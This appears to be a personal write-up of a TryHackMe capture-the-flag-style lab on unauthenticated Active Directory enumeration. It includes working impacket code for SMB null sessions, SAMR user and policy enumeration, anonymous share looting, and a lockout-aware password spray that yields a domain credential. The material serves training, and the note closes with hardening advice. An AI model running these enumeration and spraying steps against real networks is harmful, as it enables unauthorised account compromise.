# AD: Basic Enumeration (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Active Directory (room 4, after [[intro-to-ad-breaching]]).
  **Basic Enumeration** = unauthenticated recon of an AD network you've been dropped into with *no*
  credentials: map hosts -> find the DC -> loot anonymous SMB -> enumerate users/policy -> spray to a
  first valid credential.
- **Date:** 2026-10-20.
- **Status:** SOLVED - every answer verified headless from the Windows PC with impacket (SMB null session,
  SAMR, anonymous LDAP) + a lockout-safe password spray. No AttackBox needed this room.
- **Network:** `<ip>/24` (own OVPN `Jr-Pentester-AD-v01`; my tun IP `<ip>`).
  - `DC.tryhackme.loc` `<ip>` - DC/DNS/KDC (LDAP 389, SMB 445, LDAPS 636, WinRM 5985, RDP 3389).
  - `WRK.tryhackme.loc` `<ip>` - workstation / spray target (RPC 135, SMB 445, WinRM, RDP).
  - `<ip>` - VPN server, **out of scope**.
- **Domain:** `tryhackme.loc` (NetBIOS `TRYHACKME`). DC = `Windows Server 2019 Datacenter` (10.0.17763),
  WRK = `Windows Server 2019 Standard`.

## Task answers

| Task | Question | Answer |
|---|---|---|
| 2 | Domain name of the target | `tryhackme.loc` |
| 2 | Windows Server version on the DC | *(find it yourself)* |
| 3 | Flag hidden in one of the shares | `THM{…}` |
| 4 | Group `rduke` is part of | *(find it yourself)* |
| 4 | rduke's full name | *(find it yourself)* |
| 4 | Username with RID 1634 | *(find it yourself)* |
| 5 | Minimum password length | *(find it yourself)* |
| 5 | Locked account duration | *(find it yourself)* |
| 5 | Valid creds from the spray (`user:pass`) | `rduke:<redacted-pw>` |

## How each was done (headless, impacket from the PC)

**Task 2 - host discovery + DC fingerprint.** TCP-connect sweep of the /24 on the AD ports; two in-scope
hosts. `.10` exposes LDAP/SMB/LDAPS (the DC), `.20` is a member workstation. Domain + OS pulled straight
from the SMB null session and confirmed via anonymous LDAP (`operatingSystem` attribute on the computer
objects - read the DC's and WRK's editions from there, not the SMB banner):
```python
from impacket.smbconnection import SMBConnection
c = SMBConnection("<ip>", "<ip>"); c.login("", "")   # null session
c.getServerDNSDomainName()  # tryhackme.loc
c.getServerOS()             # Windows 10 / Server 2019 Build 17763  (edition via LDAP below)
```
*(SMB's banner only gives the generic build; the precise edition comes from LDAP
`operatingSystem`, so I didn't guess it from the walkthrough.)*

**Task 3 - anonymous SMB share loot.** Null-session share list showed three non-default shares -
`AnonShare` (empty), `SharedFiles`, `UserBackups`. `UserBackups\flag.txt` held the flag; the `.txt`
"stories" (`Mouse_and_Malware.txt`, `story.txt`) are Aesop-style decoys with no creds. `NETLOGON`/`SYSVOL`
were `ACCESS_DENIED` to the null session.
```python
import io
buf = io.BytesIO(); c.getFile("UserBackups", "flag.txt", buf.write)
buf.getvalue()   # THM{…}
```

**Task 4 - user enumeration (SAMR null session).** Bound `\samr` over the null session and enumerated every
user with its RID, then queried rduke's full name and global-group memberships:
```python
from impacket.dcerpc.v5 import transport, samr
dce = transport.SMBTransport("<ip>", 445, r"\samr").get_dce_rpc()
dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
sh = samr.hSamrConnect(dce)["ServerHandle"]
dom = [d["Name"] for d in samr.hSamrEnumerateDomainsInSamServer(dce, sh)["Buffer"]["Buffer"]
       if d["Name"].lower() != "builtin"][0]        # TRYHACKME
sid = samr.hSamrLookupDomainInSamServer(dce, sh, dom)["DomainId"]
dh  = samr.hSamrOpenDomain(dce, sh, domainId=sid)["DomainHandle"]
# hSamrEnumerateUsersInDomain -> (RID, name) pairs; RID 1634 -> *(find it yourself)*
# rduke RID 2609: hSamrQueryInformationUser2(UserAllInformation).FullName -> *(find it yourself)*
# hSamrGetGroupsForUser(rduke) -> [513] -> hSamrLookupIdsInDomain -> *(find it yourself)*
```
Cross-checked with **anonymous LDAP** (`(sAMAccountName=rduke)`): `displayName=*(find it yourself)*`,
`userAccountControl=66048` (enabled, pw-never-expires), no extra `memberOf` -> primary group only.
*(Equivalents the room teaches: `rpcclient -U "" -N <DC>` then `enumdomusers`/`queryuser`, or RID cycling
`for i in $(seq 500 2000); do queryuser $i ...`, or `ldapsearch -x`. SAMR over the null session gets the
same data in one shot and ran fine from Windows.)*

**Task 5 - password policy + spray.** Policy from SAMR domain info: `MinPasswordLength=*(find it yourself)*`,
`PasswordProperties=0x1` (complex), `LockoutThreshold=10`, `LockoutDuration=*(find it yourself)*`,
`LockoutObservationWindow=2 min`.
```python
samr.hSamrQueryInformationDomain2(dce, dh,
    samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)  # MinPasswordLength=*(find it yourself)*, props=0x1
samr.hSamrQueryInformationDomain2(dce, dh,
    samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)   # threshold 10, duration *(find it yourself)*
# lockout times are negative 100-ns units: minutes = abs(v)/1e7/60
```
Then sprayed the room's candidate list (`Password!`, `Password1`, `Password1!`, `P@ssword`, `Pa55word1` -
all meet the >=7 + complexity policy) one password at a time across all 30 enabled users against WRK
`.20`. 5 attempts/account is safely under the 10 lockout threshold. Hit on one of the candidate passwords:
```python
from impacket.smbconnection import SMBConnection
SMBConnection("<ip>", "<ip>").login("rduke", "<redacted-pw>", "tryhackme.loc")  # [+]
```
-> **`rduke:<redacted-pw>`** is the first valid domain credential (rduke reusing a weak pw).

## Lessons learned

- **No creds != no visibility.** A null SMB session alone leaks the domain, OS, shares, *and* (via SAMR)
  the full user list with RIDs, full names, group memberships and the password policy. Anonymous LDAP
  bind adds the same from the directory side. Lock these down: disable null sessions / anonymous LDAP,
  restrict `ms-DS-MachineAccountQuota` and directory read for `Anonymous Logon`.
- **SAMR is the programmatic `rpcclient enumdomusers`** - same RIDs, resolvable with
  `LookupIdsInDomain`/`LookupNamesInDomain`. Handy from Windows where `rpcclient` isn't installed, and it
  gives full name + group RIDs without separate `queryuser` calls.
- **Spray math = stay under lockout.** Threshold 10, observation window 2 min -> one password across all
  accounts per round keeps every account at 1 bad attempt; a 5-password batch is still safe. *Brute force*
  (many passwords vs one account) is what trips the 10-count lockout. Contrast [[intro-to-ad-breaching]]
  where the policy threshold was 5.
- **Trust the directory for the edition, not the SMB banner.** SMB reported the generic "Server 2019 Build
  17763"; LDAP `operatingSystem` gave the graded edition answer (WRK a different one) - verify, don't
  infer from a walkthrough.
- **Whole room ran headless from the PC** (impacket SMB/SAMR/LDAP + a Python spray). Unlike the breaching
  room, nothing here needed port 445 inbound or the real kerbrute binary, so no AttackBox detour.
- Impacket gotchas on Windows: `hSamrEnumerateDomainsInSamServer(dce, serverHandle)` needs the handle
  positionally; reconfigure stdout to UTF-8 (`sys.stdout.reconfigure(encoding="utf-8", errors="replace")`)
  or the cp1252 console dies on share-file text; give the LDAP bind a `socket.setdefaulttimeout(...)` or an
  unreachable/anonymous-restricted server hangs the script.

## Related

- [[intro-to-ad-breaching]] - the previous room; same black-box-to-first-cred arc (enum -> spray) but with
  credential discovery (Git/CI) and coercion on top.
- [[intro-to-ad-authentication]] - the NTLM/Kerberos internals these accounts authenticate with.
- [[ad-module-plan]] / [[tryhackme-learning-buddy]] - module trackers.
